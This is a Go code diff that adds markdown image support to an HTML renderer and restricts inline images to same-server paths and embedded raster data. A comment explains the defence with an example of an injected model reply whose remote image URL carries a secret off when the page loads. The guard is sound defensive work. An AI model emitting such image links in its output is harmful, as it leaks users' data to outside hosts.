@@ -30,6 +30,26 @@ var (
 	inlineLinkPattern = regexp.MustCompile(`\[([^\]\n]+)\]\(([^\s)]+)\)`)
 )
 
+// mdImagePattern matches a markdown image, ![alt](url). Run before the link
+// passes, which would otherwise read it as "!" and a link.
+var mdImagePattern = regexp.MustCompile(`!\[([^\]\n]*)\]\(([^\s)]+)\)`)
+
+// inlineImageDataRE is the embedded-image form an <img> may carry: a base64
+// raster in one of the types every browser shows. No SVG (it can carry script).
+var inlineImageDataRE = regexp.MustCompile(`^data:image/(png|jpeg|gif|webp);base64,[A-Za-z0-9+/=]+$`)
+
+// safeInlineImageURL reports whether a markdown image may render as an <img>.
+// Only this server's own paths and embedded rasters do. Anything else stays a
+// link, because the renderer also draws model output: an image is fetched the
+// moment the page shows it, so a remote one in an injected reply
+// (![](https://elsewhere/?q=<secret>)) would carry data off without a click.
+func safeInlineImageURL(url string) bool {
+	if strings.HasPrefix(url, "/") && !strings.HasPrefix(url, "//") && !strings.Contains(url, "\\") {
+		return true
+	}
+	return inlineImageDataRE.MatchString(url)
+}
+
 // HTMLEscape escapes special HTML characters.
 func HTMLEscape(s string) string {
 	s = strings.ReplaceAll(s, "&", "&amp;")
@@ -146,6 +166,20 @@ func InlineMarkdownToHTML(s string) string {
 		return fmt.Sprintf("\x00HTMLPROTECT%d\x00", idx)
 	})
 	s = HTMLEscape(s)
+	// Images first, so the link passes below do not read ![alt](url) as "!"
+	// and a link. One that may not render (see safeInlineImageURL) is left as
+	// it was and becomes a link like any other.
+	s = mdImagePattern.ReplaceAllStringFunc(s, func(match string) string {
+		sub := mdImagePattern.FindStringSubmatch(match)
+		if sub == nil || !safeInlineImageURL(HTMLUnescape(sub[2])) {
+			return match
+		}
+		// Parked like a protected span, so the bold / italic / code passes
+		// below cannot reach into the tag (an asterisk in the alt text).
+		idx := len(protected)
+		protected = append(protected, `<img src="`+sub[2]+`" alt="`+sub[1]+`" loading="lazy">`)
+		return fmt.Sprintf("\x00HTMLPROTECT%d\x00", idx)
+	})
 	// Auto-links — three forms:
 	//   1) `<https://url>`    → CommonMark angle-bracket auto-link
 	//   2) `<email@host>`    → mailto auto-link
@@ -663,6 +697,17 @@ func MarkdownToHTML(md string) string {
 	return out.String()
 }
 
+var htmlImgTagRE = regexp.MustCompile(`(?i)<img\b[^>]*>`)
+
+// htmlAttr returns one attribute's value from a single tag, or "".
+func htmlAttr(tag, name string) string {
+	m := regexp.MustCompile(`(?i)\s` + name + `\s*=\s*(?:"([^"]*)"|'([^']*)')`).FindStringSubmatch(tag)
+	if m == nil {
+		return ""
+	}
+	return m[1] + m[2]
+}
+
 // HTMLToMarkdown does a rough conversion of HTML back to markdown.
 func HTMLToMarkdown(html string) string {
 	s := html
@@ -696,6 +741,15 @@ func HTMLToMarkdown(html string) string {
 	// Paragraphs and breaks.
 	s = regexp.MustCompile(`<p>(.*?)</p>`).ReplaceAllString(s, "$1\n\n")
 	s = regexp.MustCompile(`<br\s*/?>`).ReplaceAllString(s, "\n")
+	// Images, attributes in any order. They were stripped with the other tags,
+	// so a page with pictures came back without them.
+	s = htmlImgTagRE.ReplaceAllStringFunc(s, func(tag string) string {
+		src := htmlAttr(tag, "src")
+		if src == "" {
+			return ""
+		}
+		return "![" + htmlAttr(tag, "alt") + "](" + src + ")"
+	})
 	// Strip remaining tags.
 	s = regexp.MustCompile(`<[^>]+>`).ReplaceAllString(s, "")
 	s = HTMLUnescape(s)
